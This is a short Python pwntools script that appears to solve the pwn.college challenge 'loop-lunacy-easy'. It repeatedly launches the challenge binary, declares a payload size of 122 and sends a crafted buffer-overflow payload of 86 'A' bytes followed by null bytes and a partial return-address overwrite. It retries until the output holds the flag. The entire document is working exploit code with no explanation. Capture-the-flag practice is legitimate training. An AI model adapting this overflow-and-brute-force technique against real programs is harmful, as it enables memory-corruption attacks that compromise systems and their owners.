from pwn import *

while True:
    p = process('/challenge/loop-lunacy-easy')

    output = p.recvuntil(b"Payload size:").decode()

    p.sendline(b'122')

    payload = b'A' * 86 + b'\x00\x00' + b'\x77' + b'\x4f\x06'

    p.recvuntil('Send your payload')

    p.send(payload)

    str = p.recvall(1)
    if str.find(b'pwn.college{') != -1:
        print(str)
        break
